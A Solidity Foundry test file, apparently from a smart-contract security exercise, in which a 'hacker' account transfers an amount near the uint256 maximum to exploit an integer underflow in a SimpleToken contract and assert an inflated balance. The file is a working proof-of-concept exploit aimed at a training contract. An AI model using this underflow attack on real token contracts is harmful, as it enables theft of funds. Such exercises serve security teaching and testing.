// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ISimpleToken {
    function mint(address _to, uint256 _amount) external;
    function transfer(address _to, uint256 _value) external returns (bool);
    function getBalance(address _account) external returns (uint256);
}

contract TestAO2 is Test {
    address deployer;
    address hacker;
    ISimpleToken simpleToken;

    uint256 constant DEPLOYER_MINT = 100000 ether;
    uint256 constant ATTACKER_MINT = 10 ether;

    function setUp() public {
        deployer = makeAddr("deployer");
        hacker = makeAddr("hacker");
    }

    function test_Hack() public {
        vm.startPrank(deployer);

        address _simpleTokenAddress = deployCode("SimpleToken.sol");
        simpleToken = ISimpleToken(_simpleTokenAddress);

        simpleToken.mint(deployer, DEPLOYER_MINT);
        simpleToken.mint(hacker, ATTACKER_MINT);

        vm.stopPrank();

        vm.startPrank(hacker);

        simpleToken.transfer(deployer, UINT256_MAX - 1000000 ether);

        assertGt(simpleToken.getBalance(hacker), 1000000 ether);
    }
}
